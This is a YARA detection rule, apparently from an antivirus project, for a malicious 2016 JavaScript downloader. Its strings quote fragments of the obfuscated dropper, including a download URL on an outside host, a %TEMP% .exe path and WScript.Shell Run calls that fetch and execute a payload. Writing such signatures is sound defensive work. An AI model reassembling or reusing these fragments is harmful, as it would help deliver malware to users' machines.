rule sig_20160328_61489486a97687fd080a4c233d12d0a5 {
  meta:
    description = "datamaliciousorder - file 20160328_61489486a97687fd080a4c233d12d0a5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8c2cf77971b457b923da8ef918398577eef34667f3f49ea13f4fcd33651c4bb9"

  strings:
    $s1  = "function Aekigea() {return Qxkpioof[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"1mPmIib3XKEjn.exe\";};" fullword ascii
    $s2  = "Kptpd[Cbyimjxlum](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Farxcupm](Dxcxk() * 11)} while (Kptpd[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Qxkpioof = function Hflfag() {return WScript[Vzlsevdf](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ljlqtdne(Ohgxpw, Swrevsi){return Ohgxpw - Swrevsi;};" fullword ascii
    $s6  = "function Nptjpmnx() {return ((Qekcuh == true) && (Qekcuh == Zrjmnrq)) ? 1 : Oeceb;};" fullword ascii
    $s7  = "function Yazazdgea(Bykmdkic){Qxkpioof[\"Run\"](Bykmdkic, Oeceb, Oeceb);};" fullword ascii
    $s8  = "Zrjmnrq = true; " fullword ascii
    $s9  = "function Dxcxk(){return 22;};" fullword ascii
    $s10 = "var Xlzbgz = new this[\"Date\"]();" fullword ascii
    $s11 = "function Azqyra(Dzwclhu) {var Seuriemph = (1, 2, 3, 4, 5, Dzwclhu); return Seuriemph;};" fullword ascii
    $s12 = "var Ovculfya = false;" fullword ascii
    $s13 = "function Vjtweho()" fullword ascii
    $s14 = "return Ljlqtdne(Lssya, Anpfbwgv);" fullword ascii
    $s15 = "var Zrjmnrq = false;" fullword ascii
    $s16 = " while (Czbifwjo){" fullword ascii
    $s17 = "Qekcuh = true; " fullword ascii
    $s18 = "function Eornpq(){return Vzlsevdf;};" fullword ascii
    $s19 = "var Qekcuh = false;" fullword ascii
    $s20 = "function Xarjcosi(){return Ccaev;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}